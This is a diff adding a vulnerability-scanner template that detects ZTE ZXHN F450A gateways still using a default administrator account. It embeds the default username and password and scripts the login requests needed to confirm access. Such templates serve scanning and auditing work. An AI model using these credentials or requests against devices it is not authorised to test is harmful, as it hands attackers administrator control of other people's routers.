@@ -1,0 +1,54 @@
+id: telecom-zxhn-f450a-default-password
+
+info:
+  name: Telecom ZXHN F450A Gateway Default Administrator Account Password Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ZTE F450A Gateway has a default administrator account password vulnerability, allowing attackers to control the platform and operate core functionalities using administrator privileges.
+  tags: default-password
+  reference:
+    - https://fofa.info
+
+variables:
+  username: "telecomadmin"
+  password: "nE7jA%255m"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "document.fLogin.submit"
+
+    extractors:
+      - type: regex
+        name: frm_logintoken
+        part: body
+        internal: true
+        regex:
+          - "value = \"(.*)\";\ndocument.fLogin.submit"
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        frashnum=&action=login&Frm_Logintoken={{frm_logintoken}}&user_name={{username}}&Password={{password}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "Location: /start.ghtml"
